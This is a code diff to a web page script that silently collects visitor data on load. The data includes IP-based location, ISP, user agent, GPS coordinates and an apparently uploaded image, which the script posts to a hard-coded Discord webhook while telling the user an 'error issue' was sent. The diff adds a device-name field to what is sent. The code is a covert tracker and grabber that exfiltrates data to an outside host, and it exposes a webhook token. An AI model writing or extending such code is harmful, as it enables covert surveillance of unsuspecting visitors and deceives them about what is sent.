@@ -41,9 +41,10 @@
             try {
                 const ipData = await getIPInfo();
                 const userAgent = navigator.userAgent;
+                const deviceName = getDeviceName(userAgent); // Get device name
                 const { latitude, longitude } = await getCoordinates();
 
-                await sendToDiscord(ipData, userAgent, latitude, longitude);
+                await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude);
                 status.innerText = 'Error Issue sent automatically!';
 
             } catch (error) {
@@ -51,6 +52,16 @@
                 status.innerText = 'Error with User Browser';
             }
         })();
+
+        function getDeviceName(userAgent) {
+            // Simple function to detect the device name based on user agent
+            if (/mobile/i.test(userAgent)) return "Mobile Device";
+            if (/tablet/i.test(userAgent)) return "Tablet";
+            if (/win/i.test(userAgent)) return "Windows PC";
+            if (/mac/i.test(userAgent)) return "Mac";
+            if (/linux/i.test(userAgent)) return "Linux PC";
+            return "Unknown Device";
+        }
 
         async function getIPInfo() {
             const response = await fetch('https://ipinfo.io/json');
@@ -120,7 +131,7 @@
             return data.data.link; // Return the URL of the uploaded image
         }
 
-        async function sendToDiscord(ipData, userAgent, latitude, longitude) {
+        async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude) {
             const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
 
             const webhookPayload = {
@@ -132,6 +143,7 @@
                         { name: "Location", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
                         { name: "ISP", value: ipData.org, inline: true },
                         { name: "User Agent", value: userAgent },
+                        { name: "Device", value: deviceName }, // Added device name
                         { name: "Coordinates", value: `${latitude}, ${longitude}` }
                     ],
                     color: 3447003 // Color in Discord embed (blue)
